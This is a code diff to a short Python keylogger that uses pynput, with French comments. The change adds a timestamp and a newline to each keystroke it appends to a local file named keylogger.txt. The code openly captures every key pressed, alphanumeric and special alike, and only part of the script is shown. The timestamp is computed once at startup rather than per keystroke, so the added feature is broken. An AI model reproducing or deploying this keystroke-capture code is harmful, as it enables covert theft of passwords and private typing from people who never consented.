@@ -1,5 +1,7 @@
 from pynput import keyboard
+from datetime import datetime
 
+timestamp = datetime.now().strftime("%d-%m-%y %H:%M:%S")
 
 def onPush(key):
     """
@@ -8,7 +10,7 @@ def onPush(key):
 
     try:
         with open("keylogger.txt", "a") as f:
-            f.write(f"{key.char}")  # on gere les touches alphanumeriques
+            f.write(f"{timestamp} : {key.char}\n")  # on gere les touches alphanumeriques
     except AttributeError as e:  # on decide de gerer les autres touches
         if key == keyboard.Key.space:
             with open("keylogger.txt", "a") as f:
@@ -18,7 +20,7 @@ def onPush(key):
                 f.write("\n")  # on ecrit dans le fichier un saut à la ligne
         else:
             with open("keylogger.txt", "a") as f:
-                f.write(f"{key}")
+                f.write(f"{timestamp} : {key}\n")
 
 def onRelease(key):
     """
